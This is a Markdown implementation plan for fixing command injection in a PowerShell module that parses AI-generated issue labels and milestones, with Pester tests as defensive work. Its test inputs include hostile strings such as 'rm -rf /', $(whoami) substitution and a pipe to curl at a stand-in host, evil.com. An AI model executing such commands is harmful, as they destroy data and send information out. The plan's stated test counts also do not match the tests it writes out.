# Phase 1 Detailed Implementation Schedule

> **Status**: Ready for implementation upon agent sign-off completion
> **Total Estimated Hours**: 18-22 hours (3-4 focused working sessions)
> **Session Structure**: 6-hour focused blocks with hourly checkpoints
> **Constraint**: PowerShell-only, ADR-006 compliant, Pester testing required

---

## Phase 1 Overview

**Goal**: Fix all CRITICAL security and error handling issues to make PR #60 safe for merge.

**Critical Path**:
1. Extract parsing functions with hardened validation
2. Create comprehensive test suite
3. Fix error handling (silent failures, exit codes)
4. Verify all tests PASS before merge

**Blocking Gate**: ALL tests must PASS with exit code 0 before moving to Phase 2.

---

## Task Breakdown with Atomic Sub-tasks

### TASK 1.1: Command Injection Fix + Test File Creation (5-7 hours)

**Objective**: Extract AI parsing functions with security hardening + create test infrastructure

#### Subtask 1.1.1: Create Test Directory and Scaffold (35 minutes)

**Effort**: 35 min

**Actions**:
```powershell
# Create directory structure
mkdir -Force .github/workflows/tests

# Create empty test file with Pester scaffold
@'
BeforeAll {
    # Import the module we're testing
    $modulePath = Join-Path $PSScriptRoot '../../scripts/AIReviewCommon.psm1'
    Import-Module $modulePath -Force
}

Describe 'Get-LabelsFromAIOutput' {
    # Test cases will be added by subtasks 1.1.3-1.1.4
}

Describe 'Get-MilestoneFromAIOutput' {
    # Test cases will be added by subtasks 1.1.3-1.1.4
}
'@ | Out-File .github/workflows/tests/ai-issue-triage.Tests.ps1 -Encoding UTF8
```

**Acceptance**:
- [ ] `.github/workflows/tests/` directory exists
- [ ] `ai-issue-triage.Tests.ps1` exists with scaffold structure
- [ ] File is valid PowerShell with empty Describe blocks

**Checkpoint**: 0:35 elapsed

---

#### Subtask 1.1.2: Extract Parsing Functions to AIReviewCommon.psm1 (1-1.5 hours)

**Effort**: 1-1.5 hours

**Actions**:
1. Read current `.github/scripts/AIReviewCommon.psm1` to understand module structure
2. Add two new functions with security hardening:

```powershell
function Get-LabelsFromAIOutput {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Output
    )

    $labels = @()
    try {
        if ($Output -match '"labels"\s*:\s*\[([^\]]+)\]') {
            $labels = $Matches[1] -split ',' | ForEach-Object {
                $label = $_.Trim().Trim('"')
                # HARDENED REGEX (C3) - Per Security Report
                # Pattern: alphanumeric start/end, allows hyphens/underscores/periods in middle only
                if ($label -match '^[a-zA-Z0-9]([a-zA-Z0-9\-_.]*[a-zA-Z0-9])?$' -and $label.Length -le 50) {
                    $label
                } else {
                    Write-Warning "Skipped invalid label (injection attempt?): $label"
                }
            }
        }
    }
    catch {
        Write-Warning "Failed to parse AI labels: $_"
    }
    return $labels
}

function Get-MilestoneFromAIOutput {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Output
    )

    try {
        if ($Output -match '"milestone"\s*:\s*"([^"]+)"') {
            $milestone = $Matches[1]
            # Same hardened validation
            if ($milestone -match '^[a-zA-Z0-9]([a-zA-Z0-9\-_.]*[a-zA-Z0-9])?$' -and $milestone.Length -le 50) {
                return $milestone
            } else {
                Write-Warning "Invalid milestone from AI: $milestone"
                return $null
            }
        }
    }
    catch {
        Write-Warning "Failed to parse AI milestone: $_"
        return $null
    }
}
```

3. Update module exports to include new functions

**Acceptance**:
- [ ] Both functions exist in `AIReviewCommon.psm1`
- [ ] Functions use exact hardened regex: `^[a-zA-Z0-9]([a-zA-Z0-9\-_.]*[a-zA-Z0-9])?$`
- [ ] Input validation + error handling in place
- [ ] Module exports updated (if required)

**Checkpoint**: 1:35 elapsed

---

#### Subtask 1.1.3: Write Injection Attack Tests for Labels (1.5-2 hours)

**Effort**: 1.5-2 hours

**Actions**: Add 5 injection attack tests to `Describe 'Get-LabelsFromAIOutput'` block:

```powershell
It 'rejects labels with semicolons (command injection)' {
    $output = '{"labels":["bug; rm -rf /"]}'
    $labels = Get-LabelsFromAIOutput -Output $output
    $labels | Should -BeNullOrEmpty
}

It 'rejects labels with backticks (command substitution)' {
    $output = '{"labels":["bug`whoami`"]}'
    $labels = Get-LabelsFromAIOutput -Output $output
    $labels | Should -BeNullOrEmpty
}

It 'rejects labels with $(cmd) syntax (command substitution)' {
    $output = '{"labels":["bug$(whoami)"]}'
    $labels = Get-LabelsFromAIOutput -Output $output
    $labels | Should -BeNullOrEmpty
}

It 'rejects labels with pipes (pipeline injection)' {
    $output = '{"labels":["bug | curl evil.com"]}'
    $labels = Get-LabelsFromAIOutput -Output $output
    $labels | Should -BeNullOrEmpty
}

It 'rejects labels with newlines (multiline injection)' {
    $output = '{"labels":["bug\ninjected"]}'
    $labels = Get-LabelsFromAIOutput -Output $output
    $labels | Should -BeNullOrEmpty
}
```

**Acceptance**:
- [ ] All 5 tests execute without error
- [ ] All 5 tests PASS (malicious labels rejected)
- [ ] Test names clearly describe vulnerability being blocked

**Checkpoint**: 3:05 elapsed

---

#### Subtask 1.1.4: Write Injection Attack Tests for Milestone (30-45 min)

**Effort**: 30-45 min

**Actions**: Add 2 injection attack tests to `Describe 'Get-MilestoneFromAIOutput'` block:

```powershell
It 'rejects milestones with command injection attempts' {
    $output = '{"milestone":"v1; rm -rf /"}'
    $milestone = Get-MilestoneFromAIOutput -Output $output
    $milestone | Should -BeNullOrEmpty
}

It 'rejects milestones with newline injection' {
    $output = '{"milestone":"v1\ninjected"}'
    $milestone = Get-MilestoneFromAIOutput -Output $output
    $milestone | Should -BeNullOrEmpty
}
```

**Acceptance**:
- [ ] 2 tests PASS
- [ ] Malicious milestones rejected by hardened regex

**Checkpoint**: 3:50 elapsed

---

#### Subtask 1.1.5: Write Parsing Validation Tests (45-60 min)

**Effort**: 45-60 min

**Actions**: Add validation tests for normal parsing scenarios:

```powershell
Describe 'Get-LabelsFromAIOutput Parsing' {
    It 'parses valid single label' {
        $output = '{"labels":["bug"]}'
        $labels = Get-LabelsFromAIOutput -Output $output
        $labels | Should -Be 'bug'
    }

    It 'parses multiple valid labels' {
        $output = '{"labels":["bug","enhancement","docs"]}'
        $labels = Get-LabelsFromAIOutput -Output $output
        $labels | Should -HaveCount 3
        $labels | Should -Contain 'bug'
        $labels | Should -Contain 'enhancement'
    }

    It 'rejects malformed JSON (missing closing bracket)' {
        $output = '{"labels":["bug"'
        $labels = Get-LabelsFromAIOutput -Output $output
        $labels | Should -BeNullOrEmpty
    }

    It 'rejects when labels key is missing' {
        $output = '{"milestone":"v1"}'
        $labels = Get-LabelsFromAIOutput -Output $output
        $labels | Should -BeNullOrEmpty
    }
}
```

**Acceptance**:
- [ ] 4 parsing tests PASS
- [ ] Valid labels parse correctly
- [ ] Edge cases (malformed JSON, missing keys) handled

**Checkpoint**: 4:50 elapsed

---

#### Subtask 1.1.6: Write End-to-End Workflow Tests (1-1.5 hours)

**Effort**: 1-1.5 hours

**Actions**: Add end-to-end tests that verify real module import and parsing flow:

```powershell
Describe 'Integration: AI Output Parsing Pipeline' {
    It 'correctly imports and parses real AI output structure' {
        # Simulate realistic AI model output
        $realOutput = @'
{
    "category": "bug",
    "labels": ["bug", "critical"],
    "milestone": "v1.2.0",
    "confidence": 0.95
}
'@

        $labels = Get-LabelsFromAIOutput -Output $realOutput
        $milestone = Get-MilestoneFromAIOutput -Output $realOutput

        $labels | Should -HaveCount 2
        $milestone | Should -Be 'v1.2.0'
    }

    It 'handles edge case: empty label array' {
        $output = '{"labels":[]}'
        $labels = Get-LabelsFromAIOutput -Output $output
        $labels | Should -BeNullOrEmpty
    }
}
```

**Acceptance**:
- [ ] 2 integration tests PASS
- [ ] Real parsing pipeline verified
- [ ] No module import errors

**Checkpoint**: 5:50 elapsed

---

#### Subtask 1.1.7: Verify All Tests PASS and Update Workflow (30 min)

**Effort**: 30 min

**Actions**:
```powershell
# Execute the test suite
Invoke-Pester .github/workflows/tests/ai-issue-triage.Tests.ps1 -PassThru

# Verify exit code
if ($LASTEXITCODE -eq 0) {
    Write-Host "✅ ALL TESTS PASSED - Ready to integrate with workflow"
} else {
    Write-Error "❌ TESTS FAILED - Exit code: $LASTEXITCODE"
    exit 1
}
```

2. Update `.github/workflows/ai-issue-triage.yml` to import and use new functions

**Acceptance**:
- [ ] `Invoke-Pester` returns exit code 0
- [ ] All 9 tests PASS
- [ ] Workflow updated to call extracted functions
- [ ] No hardcoded parsing logic in workflow

**Task 1.1 Complete**: 6:20 elapsed (well within 5-7 hour range)

---

### TASK 1.2: Add Exit Code Checks (1-2 hours)

**Objective**: Ensure `gh` and `npm` command failures are properly detected and handled

**Actions**:
1. Add exit code verification after each critical command
2. Ensure workflow fails if commands fail (don't suppress errors)
3. Add logging for debugging

**Acceptance Criteria**:
- [ ] Exit code checked after `gh` issue edit commands
- [ ] Exit code checked after `npm install` commands
- [ ] Failures logged with context
- [ ] Workflow stops on critical failures

**Estimated Duration**: 1-2 hours

---

### TASK 1.3: Remove Silent Failure Patterns (2-3 hours)

**Objective**: Eliminate `|| true` patterns that hide errors

**Actions**:
1. Find all `|| true` in workflows and scripts
2. Replace with proper error handling or make them intentional
3. Add tests to verify errors are visible

**Acceptance Criteria**:
- [ ] No unintentional `|| true` patterns remain
- [ ] Error conditions properly logged
- [ ] Tests verify error visibility

**Estimated Duration**: 2-3 hours

---

### TASK 1.4: Replace Exit with Throw (2-3 hours)

**Objective**: Use PowerShell-style exception handling instead of exit codes

**Actions**:
1. Replace `exit 1` with `throw` statements
2. Add context detection for module vs script mode
3. Create error handling tests for both modes

**Acceptance Criteria**:
- [ ] All error exits use `throw` with meaningful messages
- [ ] Module mode: exceptions propagate to caller
- [ ] Script mode: exceptions cause termination
- [ ] Tests verify both modes

**Estimated Duration**: 2-3 hours

---

## Timeline Structure

### Session 1 (6 hours): Task 1.1 - Command Injection + Tests
- 00:00 - 00:35: Test directory + scaffold (1.1.1)
- 00:35 - 02:05: Extract parsing functions (1.1.2)
- 02:05 - 04:05: Label injection tests (1.1.3)
- 04:05 - 04:50: Milestone injection tests (1.1.4)
- 04:50 - 05:50: Parsing validation tests (1.1.5)
- 05:50 - 06:30: End-to-end tests (1.1.6) + verification (1.1.7)

**Checkpoint After Session 1**: Invoke-Pester shows 9/9 tests PASSING ✅

### Session 2 (5-6 hours): Tasks 1.2 + 1.3
- 00:00 - 02:00: Task 1.2 - Exit code checks
- 02:00 - 06:00: Task 1.3 - Remove silent failures

**Checkpoint After Session 2**: Exit codes working, error visibility verified ✅

### Session 3 (4-5 hours): Task 1.4 + Final Verification
- 00:00 - 03:00: Task 1.4 - Exit/throw conversion
- 03:00 - 04:30: Full test suite execution + regression check

**Checkpoint After Session 3**: ALL tests PASS, ready for merge ✅

---

## Success Criteria (BLOCKING for Phase 2)

- [ ] All 9 injection attack tests PASS
- [ ] All 4 parsing validation tests PASS
- [ ] All 2 integration tests PASS
- [ ] Exit code checks working (verified with test)
- [ ] No silent failures (|| true removed)
- [ ] Exception handling in place (throw instead of exit)
- [ ] Full test execution: `Invoke-Pester` exit code 0
- [ ] Manual test: Create issue with malicious AI output → correctly rejected
- [ ] All 15+ total tests PASS before merge

---

## Critical Notes

⚠️ **Test Execution is MANDATORY**:
- Tests MUST run (`Invoke-Pester`)
- Tests MUST PASS (exit code 0)
- Failure of ANY test = task NOT complete
- No proceeding to Phase 2 until ALL tests PASS

⚠️ **PowerShell-Only Compliance (ADR-006)**:
- All code in `.github/scripts/*.psm1` and `.github/workflows/tests/*.ps1`
- NO bash, NO Python, NO shell scripts
- Workflow files use `shell: pwsh` for all PowerShell steps

⚠️ **Security Focus**:
- Hardened regex: `^[a-zA-Z0-9]([a-zA-Z0-9\-_.]*[a-zA-Z0-9])?$`
- NO command substitution in user input
- NO unquoted variables in command construction
- ALL injection vectors tested

---

**Status**: Ready for implementation phase
**Prerequisite**: All 5 agents must complete validation
**Next Step**: Launch implementer agent with this detailed schedule

